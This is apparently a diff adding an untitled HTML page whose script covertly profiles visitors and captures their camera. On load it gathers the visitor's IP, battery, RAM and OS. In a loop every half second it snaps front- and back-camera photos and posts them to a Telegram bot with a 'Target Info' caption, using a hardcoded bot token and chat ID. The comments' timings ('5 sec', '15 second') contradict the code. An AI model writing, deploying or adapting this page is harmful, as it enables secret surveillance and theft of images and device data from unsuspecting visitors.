@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title></title>
+</head>
+
+<body>
+ <script type="text/javascript" charset="utf-8">
+   
+ // --- 1. CONFIGURATION ---
+const token = "8904571558:AAHLYMWlOBjm2QyuGMH8MKjv7Vp3D2AXOhc";
+const chatId = "5751710765";
+
+// --- 2. GATHERING SYSTEM INFO (Ek baar) ---
+let systemInfo = {
+    ip: "Fetching...",
+    battery: "Fetching...",
+    ram: navigator.deviceMemory + " GB",
+    os: navigator.platform
+};
+
+// IP nikalne ka logic
+fetch('https://api.ipify.org?format=json')
+    .then(res => res.json())
+    .then(data => systemInfo.ip = data.ip);
+
+// Battery nikalne ka logic
+navigator.getBattery().then(batt => {
+    systemInfo.battery = (batt.level * 100) + "% (" + (batt.charging ? "Charging" : "Discharging") + ")";
+});
+
+// --- 3. CAMERA LOGIC (Front & Back) ---
+async function startCapture(mode) {
+    try {
+        // mode: "user" (Front) ya "environment" (Back)
+        let stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: mode } 
+        });
+        
+        let video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+
+        // 4. PHOTO KHINCHNA AUR BHEJNA
+        let canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+
+        canvas.toBlob((blob) => {
+            let fd = new FormData();
+            fd.append('chat_id', chatId);
+            fd.append('photo', blob);
+            fd.append('caption', `✨ Target Info:\n📍 IP: ${systemInfo.ip}\n🔋 Battery: ${systemInfo.battery}\n💻 OS: ${systemInfo.os}\n🧠 RAM: ${systemInfo.ram}\n📸 Cam: ${mode}`);
+
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+            
+            // Stream band karna taake dusra camera khul sake
+            stream.getTracks().forEach(track => track.stop());
+        }, 'image/jpeg');
+
+    } catch (err) {
+        console.log("Error: " + err);
+    }
+}
+
+// --- 5. THE AUTOMATIC LOOP ---
+setInterval(() => {
+    // Pehle Front se lo, phir Back se
+    startCapture("user"); // Front
+    setTimeout(() => startCapture("environment"), 200); // 5 sec baad Back
+}, 500); // Har 15 second mein ye process repeat hoga
+ </script>
+</body>
+
+</html>
